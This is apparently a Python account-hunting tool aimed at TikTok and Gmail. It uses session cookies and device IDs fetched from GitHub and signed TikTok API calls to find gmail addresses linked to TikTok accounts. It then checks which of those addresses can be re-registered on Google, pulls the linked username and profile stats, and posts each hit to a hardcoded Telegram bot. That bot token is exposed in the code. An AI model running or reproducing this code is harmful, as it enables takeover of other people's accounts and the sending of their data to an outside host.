import requests
import random
import uuid
import SignerPy
import re
import json
import datetime
import time
from concurrent.futures import ThreadPoolExecutor
ss = []
dv = []
bh = 0
bt = 0
bg = 0
bk = 0
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
M = "\033[95m"
C = "\033[96m"
W = "\033[97m"
X = "\033[0m"
hd = {"User-Agent": "Mozilla/5.0"}
def gh():
    global ss
    uu = "https://raw.githubusercontent.com/is-L7N/session_keys/refs/heads/main/github.txt"
    try:
        rr = requests.get(uu, headers=hd, timeout=30)
        ss = rr.text.splitlines()
    except:
        ss = []
def g2():
    global dv
    try:
        rs = requests.get("https://raw.githubusercontent.com/is-L7N/dv2/refs/heads/main/dv.txt", headers=hd, timeout=30)
        for ln in rs.text.splitlines():
            tk = ln.strip().split(":")
            if len(tk) >= 2:
                dv.append((tk[0], tk[1]))
    except:
        pass
def ch(em):
    global bh, bt, bg, bk
    pm = {'device_platform': 'android', 'ssmix': 'a', 'locale': 'en', 'language': 'en', 'channel': 'googleplay', 'aid': "1233", 'app_name': 'musical_ly', 'version_code': '360505', 'version_name': '36.5.5', 'manifest_version_code': '2023605050', 'update_version_code': '2023605050', 'ab_version': '36.5.5', 'os_version': '10', "device_id": 0, 'app_version': '30.1.2', "request_from": "profile_card_v2", "request_from_scene": '1', "scene": "1", "mix_mode": "1", "os_api": "34", "ac": "wifi", "request_tag_from": "h5"}
    pm.update({'device_type': f'rk{random.randint(3000,4000)}s_{uuid.uuid4().hex[:4]}'})
    pm = SignerPy.get(params=pm)
    hh = {'User-Agent': f'com.zhiliaoapp.musically/2022703020 (Linux;U;Android 7.1.2;en;SM-N975F;Build/N2G48H;tt-ok/{str(random.randint(1,10**19))})'}
    ck = {"sessionid": random.choice(ss)}
    dt = {'email': f'{em}@gmail.com'}    
    for _ in range(3):
        try:
            di, ii = random.choice(dv)
            pm.update({"device_id": di, "iid": ii})
            ck.update({"sessionid": random.choice(ss)})
            ur = f'https://{random.choice(["api31-normal-useast2a.tiktokv.com","api22-normal-c-alisg.tiktokv.com","api2.musical.ly","api16-normal-no1a.tiktokv.eu","rc-verification-sg.tiktokv.com","api31-normal-alisg.tiktokv.com","api16-normal-c-useast1a.tiktokv.com","api22-normal-c-useast1a.tiktokv.com","api16-normal-c-useast1a.musical.ly","api19-normal-c-useast1a.musical.ly","api.tiktokv.com","www.tiktok.com","log2.musical.ly","webcast.musical.ly","inapp.tiktokv.com","api2-19-h2.musical.ly"])}/passport/email/bind_without_verify/'
            sg = SignerPy.sign(params=pm, cookie=ck, data=dt)
            hh.update(sg)
            rs = requests.post(ur, data=dt, headers=hh, params=pm, cookies=ck, timeout=15)
            tx = rs.json()
            if "Email is linked to another account. Unlink or try another email." in str(tx):
                bh += 1
                print(f"\r{C}Gd tk{W}: {G}{bh} {W}| {Y}Bd tk{W}: {R}{bt} {W}| {M}Bd gm{W}: {R}{bg} {W}| {B}Hit{W}: {G}{bk}{X}", end='', flush=True)
                gm(em)
                break
            else:
                bt += 1
                print(f"\r{C}Gd tk{W}: {G}{bh} {W}| {Y}Bd tk{W}: {R}{bt} {W}| {M}Bd gm{W}: {R}{bg} {W}| {B}Hit{W}: {G}{bk}{X}", end='', flush=True)
                break
        except:
            time.sleep(1)
            continue
def gm(em):
    global bg
    for _ in range(3):
        try:
            ss = requests.Session()
            hh = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36', 'x-browser-channel': 'stable', 'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.'}
            pp = {'biz': 'false', 'continue': 'https://mail.google.com/mail/u/0/', 'ddm': '1', 'emr': '1', 'flowEntry': 'SignUp', 'flowName': 'GlifWebSignIn', 'followup': 'https://mail.google.com/mail/u/0/', 'osid': '1', 'service': 'mail'}
            rr = ss.get('https://accounts.google.com/lifecycle/flows/signup', params=pp, headers=hh, timeout=15)
            if 'TL=' not in rr.url or '"SNlM0e":"' not in rr.text or '"Qzxixc":"' not in rr.text:
                continue
            tl = rr.url.split('TL=')[1].split('&')[0]
            s1 = rr.text.split('"Qzxixc":"')[1].split('"')[0]
            at = rr.text.split('"SNlM0e":"')[1].split('"')[0]
            nn = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(random.randrange(5, 10)))
            hh = {'accept': '*/*', 'accept-language': 'en-US,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded;charset=UTF-8', 'origin': 'https://accounts.google.com', 'referer': 'https://accounts.google.com/', 'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36', 'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]', 'x-goog-ext-391502476-jspb': f'["{s1}"]', 'x-same-domain': '1'}
            pp = {'rpcids': 'E815hb', 'source-path': '/lifecycle/steps/signup/name', 'hl': 'en-US', 'TL': tl, 'rt': 'c'}
            dd = f'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{nn}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'
            nr = ss.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', params=pp, headers=hh, data=dd, timeout=15)
            if 'steps/signup/birthdaygender' not in nr.text:
                continue
            yy = random.randrange(1980, 2010)
            mm = random.randrange(1, 12)
            dd = random.randrange(1, 28)
            pp['source-path'] = '/lifecycle/steps/signup/birthdaygender'
            bd = f'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{yy}%2C{mm}%2C{dd}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'
            br = ss.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', params=pp, headers=hh, data=bd, timeout=15)
            if 'steps/signup/username' not in br.text:
                continue
            pp['source-path'] = '/lifecycle/steps/signup/username'
            ed = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{em}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'
            er = ss.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', params=pp, headers=hh, data=ed, timeout=15)
            if 'steps/signup/password' in er.text:
                ex(em)
                break
            else:
                bg += 1
                print(f"\r{C}Gd tk{W}: {G}{bh} {W}| {Y}Bd tk{W}: {R}{bt} {W}| {M}Bd gm{W}: {R}{bg} {W}| {B}Hit{W}: {G}{bk}{X}", end='', flush=True)
                break
        except:
            time.sleep(1)
            continue
def ex(em):
    global bk
    for _ in range(3):
        try:
            ss = requests.Session()
            gm = em + '@gmail.com'
            pm = {'device_platform': 'android', 'ssmix': 'a', 'channel': 'googleplay', 'aid': '1233', 'app_name': 'musical_ly', 'version_code': '360505', 'version_name': '36.5.5', 'manifest_version_code': '2023605050', 'update_version_code': '2023605050', 'ab_version': '36.5.5', 'os_version': '10', "device_id": 0000000000, 'app_version': '30.1.2', "request_from": "profile_card_v2", "request_from_scene": '1', "scene": "1", "mix_mode": "1", "os_api": "34", "ac": "wifi", "request_tag_from": "h5"}
            hd = {'User-Agent': f'com.zhiliaoapp.musically/2022703020 (Linux; U; Android 7.1.2; en; SM-N975F; Build/N2G48H;tt-ok/{str(random.randint(1,10**19))})'}
            pm = SignerPy.get(params=pm)
            pm.update({'device_type': f'rk{random.randint(3000,4000)}s_{uuid.uuid4().hex[:4]}', 'language': 'AR'})
            tk = None
            for _ in range(5):
                pm["account_param"] = gm
                sg = SignerPy.sign(params=pm)
                h2 = hd.copy()
                h2.update({'x-tt-passport-csrf-token': uuid.uuid4().hex, 'x-ss-req-ticket': sg['x-ss-req-ticket'], 'x-argus': sg['x-argus'], 'x-gorgon': sg['x-gorgon'], 'x-khronos': sg['x-khronos'], 'x-ladon': sg['x-ladon']})
                ul = f'https://{random.choice(["api31-normal-useast2a.tiktokv.com","api22-normal-c-alisg.tiktokv.com","api2.musical.ly","api16-normal-useast5.tiktokv.us","api16-normal-no1a.tiktokv.eu","rc-verification-sg.tiktokv.com","api31-normal-alisg.tiktokv.com","api16-normal-c-useast1a.tiktokv.com","api22-normal-c-useast1a.tiktokv.com","api16-normal-c-useast1a.musical.ly","api19-normal-c-useast1a.musical.ly","api.tiktokv.com","www.tiktok.com","log2.musical.ly","webcast.musical.ly","inapp.tiktokv.com","api2-19-h2.musical.ly"])}/passport/account_lookup/email/'
                try:
                    rp = ss.post(ul, params=pm, headers=h2, timeout=15)
                    dt = rp.json()
                    if 'data' in dt and 'accounts' in dt['data'] and dt['data']['accounts']:
                        tk = dt['data']['accounts'][0]['passport_ticket']
                        break
                except:
                    continue
            if not tk:
                continue
            fk = None
            for _ in range(5):
                try:
                    rs = requests.get("https://api.mail.tm/domains", headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, timeout=15)
                    dd = rs.json()
                    dm = dd["hydra:member"][0]["domain"]
                    ml = ''.join(random.choice("qwertyuiopasdfghjklzxcvbnm") for _ in range(12)) + "@" + dm
                    pl = {"address": ml, "password": ml}
                    rs = requests.post("https://api.mail.tm/accounts", json=pl, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, timeout=15)
                    rs = requests.post("https://api.mail.tm/token", json=pl, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, timeout=15)
                    tn = rs.json().get("token")
                    if tn:
                        fk = (ml, tn)
                        break
                except:
                    continue
            if not fk:
                continue
            for _ in range(5):
                pm["not_login_ticket"] = tk
                pm["email"] = fk[0]
                pm["type"] = "3737"
                pm.pop("fixed_mix_mode", None)
                pm.pop("account_param", None)
                sg = SignerPy.sign(params=pm)
                h3 = hd.copy()
                h3.update({'x-ss-req-ticket': sg['x-ss-req-ticket'], 'x-argus': sg['x-argus'], 'x-gorgon': sg['x-gorgon'], 'x-khronos': sg['x-khronos'], 'x-ladon': sg['x-ladon']})
                ul = f"https://{random.choice(['api22-normal-c-alisg.tiktokv.com','api31-normal-alisg.tiktokv.com','api22-normal-probe-useast2a.tiktokv.com','api16-normal-probe-useast2a.tiktokv.com','rc-verification-sg.tiktokv.com'])}/passport/email/send_code"
                try:
                    rp = ss.post(ul, params=pm, headers=h3, timeout=15)
                    rd = rp.json()
                    if rd.get("message") == "success":
                        for _ in range(20):
                            try:
                                rs = requests.get("https://api.mail.tm/messages", headers={"Authorization": f"Bearer {fk[1]}", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, timeout=15)
                                ib = rs.json()
                                mg = ib.get("hydra:member", [])
                                if mg:
                                    ix = mg[0]["id"]
                                    rs = requests.get(f"https://api.mail.tm/messages/{ix}", headers={"Authorization": f"Bearer {fk[1]}", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, timeout=15)
                                    ms = rs.json()
                                    tx = ms.get("text", "")
                                    if tx:
                                        r1 = re.search(r'تم إنشاء هذا البريد الإلكتروني من أجل\s+(.+)\.', tx)
                                        if r1:
                                            un = r1.group(1)
                                        else:
                                            pt = [r"This email was created for\s+(.+)\.", r'created for\s+(.+)\.', r'username\s*:\s*([^\s,]+)', r'@(\w+)']
                                            un = None
                                            for pn in pt:
                                                mh = re.search(pn, tx)
                                                if mh:
                                                    un = mh.group(1)
                                                    break
                                        if un:
                                            uu = f"https://www.tiktok.com/@{un}"
                                            try:
                                                rx = requests.get(uu, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, timeout=5)
                                                mx = re.search(r'({"__DEFAULT_SCOPE__":.*})</script>', rx.text)
                                                dx = json.loads(mx.group(1))["__DEFAULT_SCOPE__"]["webapp.user-detail"]["userInfo"]
                                                us, st = dx["user"], dx["stats"]
                                                ix = us.get('id', '')
                                                d2 = datetime.datetime.fromtimestamp(us.get("createTime", 0), datetime.timezone.utc).strftime("%Y/%m/%d") if us.get("createTime") else "N/A"
                                                nf = {"username": un, "name": us.get("nickname", ""), "id": ix, "followers": st.get("followerCount", ""), "following": st.get("followingCount", ""), "likes": st.get("heartCount", ""), "videos": st.get("videoCount", ""), "created": d2, 'avatarLarger': us.get('avatarMedium', '')}
                                                bk += 1
                                                print(f"\r{C}Gd tk{W}: {G}{bh} {W}| {Y}Bd tk{W}: {R}{bt} {W}| {M}Bd gm{W}: {R}{bg} {W}| {B}Hit{W}: {G}{bk}{X}", end='', flush=True)
                                                sd = f"\n{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{X}\n{C}Email         {W}: {Y}{gm}{X}\n{C}Username      {W}: {Y}@{nf['username']}{X}\n{C}Name          {W}: {Y}{nf['name']}{X}\n{C}ID            {W}: {Y}{nf['id']}{X}\n{C}Followers     {W}: {Y}{nf['followers']}{X}\n{C}Following     {W}: {Y}{nf['following']}{X}\n{C}Likes         {W}: {Y}{nf['likes']}{X}\n{C}Videos        {W}: {Y}{nf['videos']}{X}\n{C}Created       {W}: {Y}{nf['created']}{X}\n{C}By            {W}: {Y}@DD86DD{X}\n{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{X}\n"
                                                sv = f"\nEmail: {gm}\nUsername: @{nf['username']}\nName: {nf['name']}\nID: {nf['id']}\nFollowers: {nf['followers']}\nFollowing: {nf['following']}\nLikes: {nf['likes']}\nVideos: {nf['videos']}\nCreated: {nf['created']}\n";requests.post(f'https://api.telegram.org/bot7913321809:AAErW-QM2HJWUUaci_jT76OcNG1r4QG0OkQ/sendMessage?chat_id=7402878964&text={sv}')
                                                with open("sufe.txt", "a", encoding='utf-8') as ff:
                                                    ff.write(sv)
                                                print(sd)
                                                return nf
                                            except:
                                                bk += 1
                                                print(f"\r{C}Gd tk{W}: {G}{bh} {W}| {Y}Bd tk{W}: {R}{bt} {W}| {M}Bd gm{W}: {R}{bg} {W}| {B}Hit{W}: {G}{bk}{X}", end='', flush=True)
                                                sd = f'\n{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{X}\n{Y}Extraction Failed{X}\n{C}Email         {W}: {Y}{gm}{X}\n{C}By            {W}: {Y}@DD86DD{X}\n{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{X}\n'
                                                sv = f"Extraction Failed\nEmail: {gm}\nBy: @DD86DD\n{'='*50}\n"
                                                with open("sufe1.txt", "a", encoding='utf-8') as ff:
                                                    ff.write(sv)
                                                print(sd)
                                                return False
                            except:
                                pass
                            time.sleep(3)
                except:
                    continue
            break
        except:
            time.sleep(1)
            continue
    return False
def mn():
    gh()
    g2()
    try:
        with open("ff1.txt", "r") as ff:
            em = [ln.strip() for ln in ff if ln.strip()]
    except:
        return
    
    # تشغيل بدون ثريد – تسلسلي
    for email in em:
        ch(email)